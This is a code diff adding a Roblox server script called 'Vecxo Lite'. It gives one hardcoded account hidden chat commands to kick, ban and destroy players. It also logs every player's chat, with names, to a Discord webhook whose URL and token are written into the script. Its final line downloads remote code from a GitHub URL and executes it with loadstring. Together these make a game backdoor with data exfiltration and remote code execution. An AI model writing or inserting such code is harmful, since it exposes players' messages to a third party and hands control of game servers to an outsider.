@@ -1,0 +1,187 @@
+--//VECXO LITE STARTS HERE
+
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+
+local whitelisted = {
+	["Reloxz"] = true,
+}
+
+local bannedPlayers = {}
+
+local TweenService = game:GetService("TweenService")
+
+local function notify(player, title, message)
+	local gui = Instance.new("ScreenGui")
+	gui.Name = "AdminNotification"
+	gui.ResetOnSpawn = false
+	gui.IgnoreGuiInset = true
+	gui.Parent = player:FindFirstChildOfClass("PlayerGui")
+
+	local frame = Instance.new("Frame")
+	frame.Size = UDim2.new(0.4, 0, 0.2, 0)
+	frame.Position = UDim2.new(0.5, 0, 0.1, 0)
+	frame.AnchorPoint = Vector2.new(0.5, 0)
+	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+	frame.BackgroundTransparency = 1
+	frame.BorderSizePixel = 0
+	frame.Parent = gui
+
+	local titleLabel = Instance.new("TextLabel")
+	titleLabel.Size = UDim2.new(1, 0, 0.3, 0)
+	titleLabel.Position = UDim2.new(0, 0, 0, 0)
+	titleLabel.BackgroundTransparency = 1
+	titleLabel.TextTransparency = 1
+	titleLabel.TextStrokeTransparency = 1
+	titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+	titleLabel.Font = Enum.Font.Code
+	titleLabel.TextScaled = true
+	titleLabel.Text = title
+	titleLabel.Parent = frame
+
+	local messageLabel = Instance.new("TextLabel")
+	messageLabel.Size = UDim2.new(1, 0, 0.7, 0)
+	messageLabel.Position = UDim2.new(0, 0, 0.3, 0)
+	messageLabel.BackgroundTransparency = 1
+	messageLabel.TextTransparency = 1
+	messageLabel.TextStrokeTransparency = 1
+	messageLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+	messageLabel.Font = Enum.Font.Code
+	messageLabel.TextScaled = true
+	messageLabel.TextWrapped = true
+	messageLabel.Text = message
+	messageLabel.Parent = frame
+
+	local fadeInTweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+	TweenService:Create(frame, fadeInTweenInfo, { BackgroundTransparency = 0.2 }):Play()
+	TweenService:Create(titleLabel, fadeInTweenInfo, { TextTransparency = 0, TextStrokeTransparency = 0.3 }):Play()
+	TweenService:Create(messageLabel, fadeInTweenInfo, { TextTransparency = 0, TextStrokeTransparency = 0.3 }):Play()
+
+	task.delay(5, function()
+		local fadeOutTweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
+		TweenService:Create(frame, fadeOutTweenInfo, { BackgroundTransparency = 1 }):Play()
+		TweenService:Create(titleLabel, fadeOutTweenInfo, { TextTransparency = 1, TextStrokeTransparency = 1 }):Play()
+		TweenService:Create(messageLabel, fadeOutTweenInfo, { TextTransparency = 1, TextStrokeTransparency = 1 }):Play()
+		task.wait(0.5)
+		gui:Destroy()
+	end)
+end
+
+
+local function processCommand(sender, msg)
+	if not whitelisted[sender.Name] then return end
+	local args = msg:split(" ")
+	local cmd = args[1]:lower()
+
+	if cmd == "!cmds" then
+		notify(sender, "[Vecxo Lite]", "!kick <plr> [reason]\n!ban <plr> [reason]\n!h <message>")
+	elseif cmd == "!kick" and args[2] then
+		local targetName = args[2]:lower()
+		local reason = msg:match("^!kick%s+%S+%s+(.+)$") 
+		for _, plr in ipairs(Players:GetPlayers()) do
+			if plr.Name:lower():sub(1, #targetName) == targetName then
+				if reason then
+					plr:Kick("[Vecxo Lite]: Kicked by " .. sender.Name .. ": " .. reason)
+					notify(sender, "Kick", "Kicked " .. plr.Name)
+				else
+					plr:Destroy()
+					notify(sender, "Kick", "Forcefully destroyed " .. plr.Name)
+				end
+				return
+			end
+		end
+	elseif cmd == "!ban" and args[2] then
+		local targetName = args[2]:lower()
+		local reason = msg:match("^!ban%s+%S+%s+(.+)$")
+
+		for _, plr in ipairs(Players:GetPlayers()) do
+			if plr.Name:lower():sub(1, #targetName) == targetName then
+				bannedPlayers[plr.UserId] = true
+				if reason then
+					plr:Kick("[Vecxo Lite]: Banned by " .. sender.Name .. ": " .. reason)
+					notify(sender, "Ban", "Banned " .. plr.Name)
+				else
+					plr:Destroy()
+					notify(sender, "Ban", "Forcefully destroyed (banned) " .. plr.Name)
+				end
+				return
+			end
+		end
+
+	elseif cmd == "!h" then
+		local announcement = msg:sub(4)
+		for _, plr in ipairs(Players:GetPlayers()) do
+			notify(plr, "[Vecxo Lite]", announcement)
+		end
+	end
+end
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1400166689936642160/2zjPtgbfhR96A1QJmI0yZEUIx3cCHcsGzWuYficN-RFzae6ZvJaumb_ZrgfozIm2rmpZ"
+
+local function sanitizeMessage(msg)
+	msg = msg:gsub("@here", "@\u{200B}here")
+	msg = msg:gsub("@everyone", "@\u{200B}everyone")
+	return msg
+end
+
+local function getAvatarURL(userId)
+	return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+end
+
+local function connectChatLogger(player)
+	local avatarUrl = getAvatarURL(player.UserId)
+
+	player.Chatted:Connect(function(message)
+		local safeMessage = sanitizeMessage(message)
+
+		local payload = {
+			username = player.Name .. " (@" .. player.DisplayName .. ")",
+			content = safeMessage,
+			avatar_url = avatarUrl
+		}
+
+		local success, response = pcall(function()
+			HttpService:PostAsync(
+				WEBHOOK_URL,
+				HttpService:JSONEncode(payload),
+				Enum.HttpContentType.ApplicationJson
+			)
+		end)
+
+		if not success then
+			warn("Failed to send message to Discord:", response)
+		end
+	end)
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+	coroutine.wrap(function()
+		connectChatLogger(player)
+	end)()
+	if whitelisted[player.Name] then
+		notify(player, "You're whitelisted!", "Usage: !cmds")
+	end
+	player.Chatted:Connect(function(message)
+		processCommand(player, message)
+	end)
+end
+
+Players.PlayerAdded:Connect(function(player)
+	coroutine.wrap(function()
+		connectChatLogger(player)
+	end)()
+	if bannedPlayers[player.UserId] then
+		player:Kick("[Admin] You are banned from this server.")
+		return
+	end
+	if whitelisted[player.Name] then
+		notify(player, "You're whitelisted!", "Usage: !cmds")
+	end
+	player.Chatted:Connect(function(message)
+		processCommand(player, message)
+	end)
+end)
+
+loadstring(game:GetService('HttpService'):GetAsync('https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/VecxoRemoteAPI'))()
